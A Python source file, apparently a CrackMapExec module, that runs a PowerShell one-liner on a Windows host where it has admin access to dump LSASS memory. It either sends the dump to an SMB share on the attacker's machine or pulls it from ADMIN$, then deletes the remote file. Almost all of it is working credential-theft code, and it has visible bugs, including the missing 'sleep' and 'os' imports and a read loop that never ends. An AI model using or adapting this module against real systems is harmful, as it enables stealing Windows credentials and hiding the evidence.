from sys import stdout
from os.path import join
from tqdm import tqdm

from impacket.smb3structs import FILE_READ_DATA
from impacket.smbconnection import SessionError
from cme.helpers.powershell import obfs_ps_script, gen_ps_iex_cradle
from cme.helpers.misc import gen_random_string
from cme.helpers.logger import write_log, highlight
from cme.protocols.smb.remotefile import RemoteFile
from cme.servers.smb import CMESMBServer


BUF_SIZE = 16644


class CMEModule:
    '''
        Executes a oneliner to create a minidump (by default LSASS.exe)
        Module by @flgy
    '''

    name = 'minidump'
    description = 'Create a minidump of the target process'
    supported_protocols = ['smb']
    opsec_safe = False
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        FILELESS  The process is directly dumped on a local SMB server, otherwise it is dumped on the remote machine (default: False)
        PROCESS   The name of the process to dump, without .exe (default: lsass)
        PID       The PID of the process to dump (default: None)
        '''
        self.fileless = False
        if module_options and 'FILELESS' in module_options:
            self.fileless = bool(module_options['FILELESS'])
        self.process = 'lsass'
        if module_options and 'PROCESS' in module_options:
            self.process = module_options['PROCESS']
            if self.process.endswith('.exe'):
                self.process = self.process[:-4]
        self.pid = 0
        if module_options and 'PID' in module_options:
            self.pid = int(module_options['PID'])

    def on_admin_login(self, context, connection):

        def __sleep_and_print(seconds):
            for k in range(1, seconds + 1):
                stdout.write('\r{dot}'.format(dot='.' * k))
                stdout.flush()
                sleep(1)
            stdout.write('\n')

        def format_size(filesize):
            unit = "B"
            size = filesize
            if filesize / 1000000000 > 0:
                unit = "G" + unit
                size = filesize / 1000000000
            elif filesize / 1000000 > 0:
                unit = "M" + unit
                size = filesize / 1000000
            elif filesize / 1000 > 0:
                unit = "K" + unit
                size = filesize / 1000
            return str(size) + unit


        file_name = gen_random_string()
        share_name = gen_random_string()

        if self.fileless:
            smb_server = CMESMBServer(context.log, share_name, verbose=context.verbose)
            local_ip = connection.conn.getSMBServer().get_socket().getsockname()[0]
            smb_server.start()

        process_str = self.process
        if self.pid > 0:
            process_str = "-Id {pid}".format(pid=self.pid)

        output_name = ""
        if self.fileless:
            output_name = r"\\{host}\{share}\{name}".format(host=local_ip, share=share_name, name=file_name)
        else:
            output_name = r"\\127.0.0.1\ADMIN$\{name}".format(name=file_name)

        # The PowerShell oneliner comes from Out-Minidump: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
        payload = r'''
            $o='{output_file}';$p=Get-Process {process};$m=[PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting').GetNestedType('NativeMethods','NonPublic').GetMethod('MiniDumpWriteDump',[Reflection.BindingFlags]'NonPublic,Static');$fs=New-Object IO.FileStream($o, [IO.FileMode]::Create);$n=[IntPtr]::Zero;$r=$m.Invoke($null,@($p.Handle,$p.Id,$fs.SafeFileHandle,[UInt32] 2,$n,$n,$n));$fs.Close()
        '''.format(output_file=output_name, process=process_str)

        connection.ps_execute(payload)
        context.log.success('Executed launcher')
        context.log.info('Waiting 2s for completion')
        __sleep_and_print(2)

        if self.fileless:
            size = 0
            while True:
                try:
                    new_size = os.path.getsize(os.path.join("/tmp", "cme_hosted", file_name))
                    if new_size == size:
                        break
                    else:
                        __sleep_and_print(2)
                        size = new_size
                except OSError:
                    __sleep_and_print(2)

            smb_server.shutdown()
            context.log.success("Dump file received: /tmp/cme_hosted/{name}.".format(name=file_name))

        else:
            context.log.info(r'Opening: ADMIN$\{output_file}'.format(output_file=file_name))
            f = RemoteFile(connection.conn, file_name, share='ADMIN$', access=FILE_READ_DATA)
            try:
                f.open()
            except SessionError as e:
                print(e)
                context.log.info('File not found, sleeping to wait for the dump to finish')
                context.log.info('Sleeping 5s')
                __sleep_and_print(5)

                try:
                    f.open()
                except SessionError as e:
                    context.log.error('File not found, aborting..')
                    return

            filesize = f.size()
            context.log.info(
                r'Reading: {output_file}, about {filesize}'.format(output_file=output_name, filesize=format_size(filesize))
            )
            outputfile = "{host}_{process}_{output_name}.dmp".format(
                host=connection.hostname if connection.hostname else connection.host,
                process=process_str.split(" ")[-1] if " " in process_str else process_str,
                output_name=file_name
            )
            output = open(outputfile, "wb")

            pbar = tqdm(total=filesize)
            bytesRead = f.read(BUF_SIZE)
            while bytesRead != '':
                pbar.update(BUF_SIZE)
                output.write(bytesRead)
                bytesRead = f.read(BUF_SIZE)

            output.close()
            pbar.close()
            f.close()
            f.delete()
            context.log.success('Dump file saved as {output} and remote file deleted.'.format(output=outputfile))
